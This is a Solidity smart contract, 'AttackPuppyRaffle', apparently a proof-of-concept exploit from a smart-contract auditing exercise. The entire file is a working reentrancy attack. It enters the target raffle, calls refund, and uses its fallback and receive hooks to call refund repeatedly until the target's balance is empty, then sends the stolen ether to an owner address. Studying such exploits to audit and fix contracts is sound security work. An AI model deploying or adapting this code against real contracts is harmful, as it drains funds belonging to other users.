// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

contract AttackPuppyRaffle {
    address payable private immutable i_puppyRaffle;
    address payable private immutable i_owner;

    uint256 private s_index;

    constructor(address _target, address _owner) {
        i_puppyRaffle = payable(_target);
        i_owner = payable(_owner);
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        uint256 entranceFee = _getEntranceFee();
        _enterRaffle(entranceFee, players);
        s_index = _getIndex();
        _refund(s_index);
    }

    function _getEntranceFee() internal returns (uint256 entranceFee) {
        (, bytes memory data) = i_puppyRaffle.call(abi.encodeWithSignature("entranceFee()"));
        entranceFee = abi.decode(data, (uint256));
    }

    function _getIndex() internal returns (uint256 index) {
        (, bytes memory data) =
            i_puppyRaffle.call(abi.encodeWithSignature("getActivePlayerIndex(address)", address(this)));
        index = abi.decode(data, (uint256));
    }

    function _enterRaffle(uint256 _entranceFee, address[] memory _players) internal {
        (bool success,) =
            i_puppyRaffle.call{value: _entranceFee}(abi.encodeWithSignature("enterRaffle(address[])", _players));
        require(success, "AttackPuppyRaffle: Failed to enter raffle");
    }

    function _refund(uint256 index) internal {
        (bool success,) = i_puppyRaffle.call(abi.encodeWithSignature("refund(uint256)", index));
        require(success, "AttackPuppyRaffle: Failed to refund");
    }

    function _stealMoney() internal {
        if (i_puppyRaffle.balance > 0) {
            _refund(s_index);
        } else {
            (bool success,) = i_owner.call{value: address(this).balance}("");
            require(success, "AttackPuppyRaffle: Failed to send funds to owner");
        }
    }
}
